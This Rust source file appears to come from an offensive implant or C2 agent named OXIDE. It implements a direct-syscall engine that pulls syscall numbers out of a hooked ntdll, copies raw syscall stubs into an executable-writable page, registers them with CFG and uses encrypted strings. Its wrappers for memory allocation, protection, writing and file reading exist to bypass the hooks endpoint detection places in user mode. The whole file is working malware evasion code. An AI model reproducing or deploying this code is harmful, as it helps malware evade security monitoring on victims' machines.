/// Direct-syscall engine for OXIDE.
///
/// At startup, `ensure_init()` scans each Nt* export in the loaded (possibly
/// EDR-hooked) ntdll for the `mov eax, <ssn>` pattern, copies hand-written
/// stubs into an RWX page, and patches the SSN into each stub.
///
/// Because the stubs execute a raw `syscall` instruction (not an ntdll export
/// call), every subsequent Nt* call bypasses every user-mode hook an EDR has
/// placed in ntdll — the call lands directly in the kernel, invisible to the
/// EDR's trampoline.
///
/// Fallback: if init fails (allocation error, no ntdll) every wrapper falls
/// back to the corresponding Win32 / std call so the agent keeps running.

use std::sync::Once;
use std::sync::atomic::{AtomicPtr, Ordering};

// ── Syscall slot indices ──────────────────────────────────────────────────────

const SYS_PROTECT_VM:  usize = 0; // NtProtectVirtualMemory
const SYS_ALLOC_VM:    usize = 1; // NtAllocateVirtualMemory
const SYS_WRITE_VM:    usize = 2; // NtWriteVirtualMemory
const SYS_CREATE_FILE: usize = 3; // NtCreateFile
const SYS_READ_FILE:   usize = 4; // NtReadFile
const SYS_CLOSE:       usize = 5; // NtClose
const SYS_COUNT:       usize = 6;

const STUB_STRIDE: usize = 16; // bytes per stub (11 used, 5 padding)
const SSN_BYTE:    usize = 4;  // offset of the SSN imm32 inside each stub

// Template: mov r10,rcx | mov eax,0 | syscall | ret
static TEMPLATE: [u8; 11] = [
    0x4C, 0x8B, 0xD1,              // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>  ← patched per stub
    0x0F, 0x05,                    // syscall
    0xC3,                          // ret
];

static INIT:      Once           = Once::new();
static STUB_BASE: AtomicPtr<u8>  = AtomicPtr::new(std::ptr::null_mut());

// ── NT structures ─────────────────────────────────────────────────────────────

#[repr(C)]
struct UnicodeString {
    length:     u16,
    max_length: u16,
    _pad:       u32,
    buffer:     *const u16,
}

// x64 OBJECT_ATTRIBUTES (48 bytes): Length(4)+pad(4)+RootDir(8)+ObjectName(8)+
//                                   Attributes(4)+pad(4)+SecurityDesc(8)+SecurityQoS(8)
#[repr(C)]
struct ObjectAttributes {
    length:       u32,
    _pad0:        u32,
    root_dir:     usize,
    object_name:  *mut UnicodeString,
    attributes:   u32,
    _pad1:        u32,
    security_desc: usize,
    security_qos:  usize,
}

// IO_STATUS_BLOCK: union{Status(i32);Pointer(*)} as i64 for 8-byte alignment,
//                  then Information(usize).
#[repr(C)]
struct IoStatusBlock {
    status_union: i64,
    information:  usize,
}

impl IoStatusBlock {
    fn new() -> Self { IoStatusBlock { status_union: 0, information: 0 } }
    fn ntstatus(&self) -> i32 { self.status_union as i32 }
}

// ── SSN extraction ─────────────────────────────────────────────────────────────

/// Scans up to 64 bytes of a syscall stub for the `mov eax, <ssn>` encoding.
///
/// Two patterns are recognised so that stubs with an inline EDR trampoline
/// at the start still yield the correct number:
///  1. `mov r10,rcx` (4C 8B D1) immediately followed by `mov eax,<ssn>` (B8 ...)
///  2. Any bare `mov eax,imm32` near the start of the stub
fn extract_ssn(bytes: &[u8]) -> Option<u32> {
    let limit = bytes.len().min(64);

    // Pattern 1 — canonical NT stub prologue
    for i in 3..limit.saturating_sub(4) {
        if bytes[i]     == 0xB8
        && bytes[i - 3] == 0x4C
        && bytes[i - 2] == 0x8B
        && bytes[i - 1] == 0xD1
        && i + 5 <= bytes.len()
        {
            return Some(u32::from_le_bytes([
                bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4],
            ]));
        }
    }

    // Pattern 2 — bare `mov eax,imm32` (covers hooked stubs with a JMP prefix)
    for i in 0..limit.saturating_sub(4) {
        if bytes[i] == 0xB8 && i + 5 <= bytes.len() {
            return Some(u32::from_le_bytes([
                bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4],
            ]));
        }
    }

    None
}

// ── Initialization ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn init_inner() {
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        SetProcessValidCallTargets, CFG_CALL_TARGET_INFO,
    };
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    use windows_sys::Win32::System::Diagnostics::Debug::FlushInstructionCache;

    // ── 1. Get ntdll base ─────────────────────────────────────────────────────
    let ntdll_name = {
        let mut v = oxide_macros::encrypt_str!("ntdll.dll").into_bytes();
        v.push(0);
        v
    };
    let ntdll = GetModuleHandleA(ntdll_name.as_ptr() as _);
    if ntdll == 0 { return; }

    // ── 2. Allocate one RWX page ──────────────────────────────────────────────
    let region_size = 0x1000usize;
    let rgn = VirtualAlloc(
        std::ptr::null(), region_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    ) as *mut u8;
    if rgn.is_null() { return; }

    // ── 3. Write templates + SSNs ─────────────────────────────────────────────
    let fn_names = vec![
        oxide_macros::encrypt_str!("NtProtectVirtualMemory"),
        oxide_macros::encrypt_str!("NtAllocateVirtualMemory"),
        oxide_macros::encrypt_str!("NtWriteVirtualMemory"),
        oxide_macros::encrypt_str!("NtCreateFile"),
        oxide_macros::encrypt_str!("NtReadFile"),
        oxide_macros::encrypt_str!("NtClose"),
    ];
    for (i, name) in fn_names.iter().enumerate() {
        let stub = rgn.add(i * STUB_STRIDE);
        // Copy template then pad remaining bytes with int3 (0xCC)
        std::ptr::copy_nonoverlapping(TEMPLATE.as_ptr(), stub, TEMPLATE.len());
        for j in TEMPLATE.len()..STUB_STRIDE {
            stub.add(j).write(0xCC);
        }

        let name_cstr: Vec<u8> = { let mut v = name.clone().into_bytes(); v.push(0); v };
        let fn_ptr = GetProcAddress(ntdll, name_cstr.as_ptr() as _);
        if let Some(f) = fn_ptr {
            let fn_bytes = std::slice::from_raw_parts(f as *const u8, 64);
            if let Some(ssn) = extract_ssn(fn_bytes) {
                let ssn_bytes = ssn.to_le_bytes();
                std::ptr::copy_nonoverlapping(ssn_bytes.as_ptr(), stub.add(SSN_BYTE), 4);
            }
        }
    }

    // ── 4. Flush instruction cache so CPU sees the written stubs ──────────────
    FlushInstructionCache(GetCurrentProcess(), rgn as _, SYS_COUNT * STUB_STRIDE);

    // ── 5. Register every stub with CFG ───────────────────────────────────────
    //       Without this, indirect calls into the RWX region are blocked by CFG.
    let mut targets: Vec<CFG_CALL_TARGET_INFO> = (0..SYS_COUNT)
        .map(|i| CFG_CALL_TARGET_INFO {
            Offset: (i * STUB_STRIDE) as usize,
            Flags:  1, // CFG_CALL_TARGET_VALID
        })
        .collect();
    SetProcessValidCallTargets(
        GetCurrentProcess(),
        rgn as _,
        region_size,
        SYS_COUNT as u32,
        targets.as_mut_ptr(),
    );

    STUB_BASE.store(rgn, Ordering::Release);
}

/// Initialise the stub region (idempotent, thread-safe).
pub fn ensure_init() {
    #[cfg(target_os = "windows")]
    INIT.call_once(|| unsafe { init_inner() });
}

/// Returns a pointer to stub `id`, or None if init failed.
fn stub_ptr(id: usize) -> Option<*const u8> {
    ensure_init();
    let base = STUB_BASE.load(Ordering::Acquire);
    if base.is_null() { None } else { Some(unsafe { base.add(id * STUB_STRIDE) }) }
}

// ── Public wrappers ───────────────────────────────────────────────────────────

/// NtProtectVirtualMemory — like VirtualProtect but via direct syscall.
/// Returns the old protection on success.
pub unsafe fn nt_virtual_protect(addr: *mut u8, size: usize, protect: u32) -> Option<u32> {
    if let Some(p) = stub_ptr(SYS_PROTECT_VM) {
        // NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize, NewProtect, &OldProtect)
        let f: unsafe extern "system" fn(
            isize, *mut *mut u8, *mut usize, u32, *mut u32,
        ) -> i32 = std::mem::transmute(p);
        let mut base = addr;
        let mut sz   = size;
        let mut old  = 0u32;
        if f(-1isize, &mut base, &mut sz, protect, &mut old) >= 0 {
            return Some(old);
        }
    }
    // Fallback: Win32 VirtualProtect
    #[cfg(target_os = "windows")]
    {
        use windows_sys::Win32::System::Memory::VirtualProtect;
        let mut old = 0u32;
        if VirtualProtect(addr as _, size, protect, &mut old) != 0 {
            return Some(old);
        }
    }
    None
}

/// NtAllocateVirtualMemory — like VirtualAlloc(NULL, size, MEM_COMMIT|RESERVE, protect).
pub unsafe fn nt_virtual_alloc(size: usize, protect: u32) -> Option<*mut u8> {
    if let Some(p) = stub_ptr(SYS_ALLOC_VM) {
        // NtAllocateVirtualMemory(Process, &Base, ZeroBits, &Size, AllocType, Protect)
        let f: unsafe extern "system" fn(
            isize, *mut *mut u8, usize, *mut usize, u32, u32,
        ) -> i32 = std::mem::transmute(p);
        let mut base: *mut u8 = std::ptr::null_mut();
        let mut sz = size;
        if f(-1isize, &mut base, 0, &mut sz, 0x3000u32, protect) >= 0 && !base.is_null() {
            return Some(base);
        }
    }
    // Fallback: Win32 VirtualAlloc
    #[cfg(target_os = "windows")]
    {
        use windows_sys::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE};
        let p = VirtualAlloc(std::ptr::null(), size, MEM_COMMIT | MEM_RESERVE, protect);
        if !p.is_null() { return Some(p as *mut u8); }
    }
    None
}

/// NtWriteVirtualMemory — writes `size` bytes to in-process `addr`.
/// Bypasses EDR hooks that watch for writes to executable regions.
/// The page must already be writable (call nt_virtual_protect first).
pub unsafe fn nt_write_virtual_memory(addr: *mut u8, buf: *const u8, size: usize) -> bool {
    if let Some(p) = stub_ptr(SYS_WRITE_VM) {
        // NtWriteVirtualMemory(Process, Base, Buffer, Size, &Written)
        let f: unsafe extern "system" fn(
            isize, *mut u8, *const u8, u32, *mut u32,
        ) -> i32 = std::mem::transmute(p);
        if f(-1isize, addr, buf, size as u32, std::ptr::null_mut()) >= 0 {
            return true;
        }
    }
    // Fallback: direct copy (page must be writable)
    std::ptr::copy_nonoverlapping(buf, addr, size);
    true
}

/// Opens a file by NT object-manager path (`\??\C:\Windows\System32\ntdll.dll`)
/// via direct NtCreateFile syscall. Returns the HANDLE on success.
pub unsafe fn nt_open_file(nt_path: &str) -> Option<isize> {
    let p = stub_ptr(SYS_CREATE_FILE)?;
    let wide: Vec<u16> = nt_path.encode_utf16().collect();
    let mut us = UnicodeString {
        length:     (wide.len() * 2) as u16,
        max_length: (wide.len() * 2) as u16,
        _pad:       0,
        buffer:     wide.as_ptr(),
    };
    let mut oa = ObjectAttributes {
        length:       48,
        _pad0:        0,
        root_dir:     0,
        object_name:  &mut us as *mut _,
        attributes:   0x40, // OBJ_CASE_INSENSITIVE
        _pad1:        0,
        security_desc: 0,
        security_qos:  0,
    };
    let mut iosb   = IoStatusBlock::new();
    let mut handle: isize = 0;

    // NtCreateFile(FileHandle, DesiredAccess, ObjAttr, IoStatusBlock,
    //              AllocSize, FileAttrib, ShareAccess, CreateDisp,
    //              CreateOptions, EaBuffer, EaLength)
    let f: unsafe extern "system" fn(
        *mut isize, u32, *mut ObjectAttributes, *mut IoStatusBlock,
        *mut i64, u32, u32, u32, u32, *mut (), u32,
    ) -> i32 = std::mem::transmute(p);

    let st = f(
        &mut handle,
        0x8010_0000u32, // GENERIC_READ | SYNCHRONIZE
        &mut oa,
        &mut iosb,
        std::ptr::null_mut(), // AllocationSize
        0,       // FileAttributes (normal)
        1,       // ShareAccess = FILE_SHARE_READ
        1,       // CreateDisposition = FILE_OPEN
        0x60u32, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
        std::ptr::null_mut(), // EaBuffer
        0,       // EaLength
    );
    if st >= 0 { Some(handle) } else { None }
}

/// Reads all bytes from a file HANDLE via direct NtReadFile syscall.
pub unsafe fn nt_read_all(handle: isize) -> Vec<u8> {
    const STATUS_END_OF_FILE: i32 = 0xC000_0011u32 as i32;
    const CHUNK: usize = 0x10000;

    let mut out = Vec::<u8>::new();
    if let Some(p) = stub_ptr(SYS_READ_FILE) {
        // NtReadFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        //            Buffer, Length, ByteOffset, Key)
        let f: unsafe extern "system" fn(
            isize, isize, *mut (), *mut (), *mut IoStatusBlock,
            *mut u8, u32, *mut i64, *mut u32,
        ) -> i32 = std::mem::transmute(p);

        let mut offset: i64 = 0;
        loop {
            let start = out.len();
            out.resize(start + CHUNK, 0u8);
            let mut iosb = IoStatusBlock::new();
            let st = f(
                handle, 0,
                std::ptr::null_mut(), std::ptr::null_mut(),
                &mut iosb,
                out[start..].as_mut_ptr(),
                CHUNK as u32,
                &mut offset,
                std::ptr::null_mut(),
            );
            let got = iosb.information;
            out.truncate(start + got);
            if st == STATUS_END_OF_FILE || st < 0 || got == 0 || got < CHUNK { break; }
            offset += got as i64;
        }
    }
    out
}

/// NtClose — closes a kernel HANDLE via direct syscall.
pub unsafe fn nt_close(handle: isize) {
    if let Some(p) = stub_ptr(SYS_CLOSE) {
        let f: unsafe extern "system" fn(isize) -> i32 = std::mem::transmute(p);
        f(handle);
    } else {
        #[cfg(target_os = "windows")]
        { windows_sys::Win32::Foundation::CloseHandle(handle); }
    }
}

/// Convenience: open + read all bytes + close a file by NT path.
/// Falls back to std::fs::read if the stubs are not available.
pub unsafe fn nt_read_file(nt_path: &str) -> Option<Vec<u8>> {
    let handle = nt_open_file(nt_path)?;
    let data = nt_read_all(handle);
    nt_close(handle);
    if data.is_empty() { None } else { Some(data) }
}
